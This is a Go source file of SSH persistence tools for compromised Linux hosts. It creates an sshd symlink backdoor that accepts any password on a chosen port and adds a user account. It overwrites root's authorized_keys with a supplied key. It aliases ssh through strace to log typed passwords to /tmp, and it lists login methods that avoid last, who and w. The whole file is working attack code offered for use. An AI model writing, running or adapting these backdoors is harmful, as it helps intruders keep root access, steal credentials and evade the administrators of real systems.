package maintance

import (
	"fmt"
	"os"
	"os/exec"
)

func Soft_Link(port string, user string) {
	fmt.Println("use the ssh soft link to maintance the privilege")
	cmd1 := exec.Command("ln", "-sf", "/usr/sbin/sshd", "/tmp/su")
	err := cmd1.Run()
	if err != nil {
		fmt.Println("Error creating symbolic link:", err)
		os.Exit(1)
	}
	cmd2 := exec.Command("/tmp/su", fmt.Sprintf("-oPort=%s", port))
	err = cmd2.Run()
	if err != nil {
		fmt.Println("Error creating running a new su command", err)
		os.Exit(1)
	}
	cmd3 := exec.Command("useradd", fmt.Sprintf(user), "-p", fmt.Sprintf(user))
	err = cmd3.Run()
	if err != nil {
		fmt.Println("Error creating new user,it may already have the this username,please input another", err)
		os.Exit(1)
	}
	fmt.Println(fmt.Sprintf("success,please login the server in the port of %s and the user %s with any password", port, user))
}
func Public_Key(publickey string) {
	fmt.Println("use the ssh public key to maintance the privilege")
	cmd1 := exec.Command("sh", "-c", fmt.Sprintf("echo '%s' > /root/.ssh/authorized_keys", publickey))
	err := cmd1.Run()
	if err != nil {
		fmt.Println("Error", err)
		os.Exit(1)
	}
	cmd2 := exec.Command("chmod", "600", "/root/.ssh/authorized_keys")
	err = cmd2.Run()
	if err != nil {
		fmt.Println("Error", err)
		os.Exit(1)
	}
	cmd3 := exec.Command("chmod", "700", "/root/.ssh")
	err = cmd3.Run()
	if err != nil {
		fmt.Println("Error", err)
		os.Exit(1)
	}
	fmt.Println("success")
}
func Key_Logger() {
	fmt.Println("use the ssh key_logger to maintance the privilege")
	cmd := exec.Command("sh", "-c", "alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'")
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error", err)
		os.Exit(1)
	}
	fmt.Println("success")
	fmt.Println("you can try to find the ssh password in the /tmp/sshpwd-* after someone log in with ssh server")
}
func Stealth_Login() {
	fmt.Println("use the ssh stealth_login to maintance the privilege,it will not be detected by commands such as last who w")
	fmt.Println("way1:ssh -T username@host /bin/bash -i")
	fmt.Println("way2:ssh -o UserKnownHostsFile=/dev/null -T user@host  and then /bin/bash -if")
}
